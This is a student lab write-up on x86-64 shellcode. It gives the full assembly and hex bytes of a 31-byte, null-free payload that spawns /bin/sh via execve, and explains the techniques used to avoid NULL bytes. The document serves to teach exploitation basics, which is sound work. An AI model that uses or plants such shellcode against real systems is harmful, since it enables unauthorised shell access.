# Shell code

The goal of this lab was to learn how to write x86-64 bit program in assembly that can be loaded by a C program.

This shellcode will execute /bin/sh using exceve.
 
We also learned about gdb through using it to help debug our assembly program by seeing the content of the registers, the codes, the memory, and see the flow of the program. 

## Program
```
// Shellcode lab
// Author: Long Tran
.globl _start
.section .text
_start:
    // zero out rax
    xor %rax, %rax
    // push to have array of zeroes on the stack
    pushq %rax
    // %rsi and %rdx - set these to the address leading to an empty array of pointers.
    // we don't need a pointer to an empty string
    movq %rsp, %rsi
    movq %rsp, %rdx
    
    // %rdi - path
    // "/bin/sh 0x2F62696E2F7368
    // needs to change to little endianess
    movq $0x68732F6E69622F3b, %rbx 
    // retrieve 0x3b, put it in lower 8-bit of rax
    mov %bl, %al

    // push the string
    pushq %rbx
    // copy the stack pointer
    movq %rsp, %rdi
    // increase it by one to get past 0x3b
    inc %rdi

    syscall
```
### Explanation

To set up for the system call, we basically need the following:

1. Put 0x3b into %rax
2. Push 8 bytes of 0x0 onto the stack. 
3. Store the address of the memory of the pushed 0 in %rsi (argv) and %rdx (env). This will lead to an empty array of pointers. 
4. Push the string "/bin/sh" onto the stack.
5. Store the address of the string in %rdi. 
6. Call the system call with `syscall`

However, to remove the zero byte and reduce the size. I made some changes. A detailed instruction can be seen through the comments of the assembly code. 

### Report

My shell code is 31 bytes long. Here they are:

    48 31 c0 50 48 89 e6 48 89 e2 48 bb 3b 2f 62 69 6e 2f 73 68 88 d8 53 48 89 e7 48 ff c7 f 5

### Explanation for NULL bytes        

As can be seen from the hexdump, there is no 0 bytes in the code.
I made sure that there are no NULL bytes by adding a check in the shellcode_tester.c and check if there is a 0 byte read. If there is a 0 byte read, then the program exits.

I realized through adding and removing instructions that the zero bytes only come from the intermediate numbers (e.g: $0x3b) to fill up the 8 bytes.

Thus, to eliminate NULL bytes, I did 2 things: 
1. I xor 2 registers to get a value 0 without having to write $0x0. 
2. I combined both the string "/bin/sh" and the code system call code 0x3b into one number to remove the buffered 0x0 byte from the string. To get the code, I only simply need to get the lower 8 byte from the register. I then pushed the entire number and to get the address of the string "/bin/sh" only, I incremented the stack pointer by one to get pass 0x3b. 

I realized the problem I had last time in class, it was because after the string, there were no 0 to end the string.